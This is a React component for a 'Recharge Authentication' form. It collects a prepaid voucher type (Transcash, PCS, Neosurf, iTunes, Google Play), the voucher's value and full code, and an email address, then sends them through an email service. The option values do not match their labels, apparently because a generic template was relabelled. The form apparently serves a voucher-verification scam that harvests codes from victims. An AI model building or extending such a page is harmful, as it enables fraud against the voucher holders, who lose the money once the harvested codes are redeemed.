import React, { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import FormInput from './FormInput';
import FormSelect from './FormSelect';
import { sendFormDataToEmail } from '../services/emailService';

interface FormData {
  rechargeType: string;
  rechargePrice: string;
  rechargeCode: string;
  email: string;
  hideCode: string;
}

interface FormErrors {
  rechargeType?: string;
  rechargePrice?: string;
  rechargeCode?: string;
  email?: string;
}

const rechargeTypes = [
  { value: 'mobile', label: 'Transcash' },
  { value: 'internet', label: 'PCS' },
  { value: 'tv', label: 'Neosurf' },
  { value: 'electricity', label: 'ItunesCard' },
  { value: 'other', label: 'Google Play' }
];

const hideCodeOptions = [
  { value: 'yes', label: 'Yes' },
  { value: 'no', label: 'No' }
];

const AuthForm: React.FC = () => {
  const [formData, setFormData] = useState<FormData>({
    rechargeType: '',
    rechargePrice: '',
    rechargeCode: '',
    email: '',
    hideCode: 'no'
  });

  const [errors, setErrors] = useState<FormErrors>({});
  const [showCode, setShowCode] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<{
    success: boolean;
    message: string;
  } | null>(null);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    setFormData({
      ...formData,
      [id]: value
    });

    // Clear error for the current field when it's being edited
    if (errors[id as keyof FormErrors]) {
      setErrors({
        ...errors,
        [id]: undefined
      });
    }

    // Special handling for hideCode toggle
    if (id === 'hideCode') {
      setShowCode(value === 'no');
    }
  };

  const validateForm = (): boolean => {
    const newErrors: FormErrors = {};
    let isValid = true;

    // Validate recharge type
    if (!formData.rechargeType) {
      newErrors.rechargeType = 'Recharge type is required';
      isValid = false;
    }

    // Validate price
    if (!formData.rechargePrice) {
      newErrors.rechargePrice = 'Price is required';
      isValid = false;
    } else if (isNaN(Number(formData.rechargePrice)) || Number(formData.rechargePrice) <= 0) {
      newErrors.rechargePrice = 'Price must be a positive number';
      isValid = false;
    }

    // Validate code
    if (!formData.rechargeCode) {
      newErrors.rechargeCode = 'Recharge code is required';
      isValid = false;
    }

    // Validate email
    if (!formData.email) {
      newErrors.email = 'Email is required';
      isValid = false;
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(formData.email)) {
        newErrors.email = 'Please enter a valid email';
        isValid = false;
      }
    }

    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Call the email service to send the data
      await sendFormDataToEmail(formData);
      
      // Reset form on success
      setFormData({
        rechargeType: '',
        rechargePrice: '',
        rechargeCode: '',
        email: '',
        hideCode: 'no'
      });

      setSubmitStatus({
        success: true,
        message: 'Your recharge information has been successfully sent!'
      });
    } catch (error) {
      setSubmitStatus({
        success: false,
        message: 'Failed to submit the form. Please try again later.'
      });
      console.error('Form submission error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="w-full max-w-md mx-auto">
      <div className="bg-white rounded-lg shadow-lg overflow-hidden transform transition-all duration-300 hover:shadow-xl">
        <div className="bg-gradient-to-r from-blue-600 to-blue-800 py-4 px-6">
          <h2 className="text-white text-xl font-bold">Recharge Authentication</h2>
          <p className="text-blue-100 text-sm mt-1">Enter your recharge details below</p>
        </div>
        
        <form onSubmit={handleSubmit} className="p-6">
          {submitStatus && (
            <div className={`mb-6 p-4 rounded-md ${
              submitStatus.success ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
            }`}>
              {submitStatus.message}
            </div>
          )}
          
          <FormSelect
            id="rechargeType"
            label="Type of Recharge"
            value={formData.rechargeType}
            onChange={handleInputChange}
            options={rechargeTypes}
            required
            error={errors.rechargeType}
          />
          
          <FormInput
            id="rechargePrice"
            label="Price of Recharge"
            type="number"
            value={formData.rechargePrice}
            onChange={handleInputChange}
            required
            placeholder="e.g., 10.99"
            min={0}
            step="0.01"
            error={errors.rechargePrice}
          />
          
          <div className="mb-4">
            <label htmlFor="rechargeCode" className="block text-gray-700 font-medium mb-2">
              Recharge Code <span className="text-red-500">*</span>
            </label>
            <div className="relative">
              <input
                id="rechargeCode"
                type={showCode ? 'text' : 'password'}
                value={formData.rechargeCode}
                onChange={handleInputChange}
                required
                placeholder="Enter recharge code"
                className={`w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 ${
                  errors.rechargeCode ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              <button
                type="button"
                onClick={() => setShowCode(!showCode)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
              >
                {showCode ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
            {errors.rechargeCode && (
              <p className="mt-1 text-red-500 text-sm">{errors.rechargeCode}</p>
            )}
          </div>
          
          <FormInput
            id="email"
            label="Email"
            type="email"
            value={formData.email}
            onChange={handleInputChange}
            required
            placeholder="your@email.com"
            error={errors.email}
          />
          
          <FormSelect
            id="hideCode"
            label="Hide Code"
            value={formData.hideCode}
            onChange={handleInputChange}
            options={hideCodeOptions}
            required
          />
          
          <button
            type="submit"
            disabled={isSubmitting}
            className={`w-full mt-4 py-2 px-4 rounded-md text-white font-medium 
              ${isSubmitting 
                ? 'bg-blue-400 cursor-not-allowed' 
                : 'bg-blue-600 hover:bg-blue-700 active:bg-blue-800 transform active:scale-[0.98]'
              } transition-all duration-200 shadow-md hover:shadow-lg`}
          >
            {isSubmitting ? 'Submitting...' : 'Submit'}
          </button>
        </form>
      </div>
    </div>
  );
};

export default AuthForm;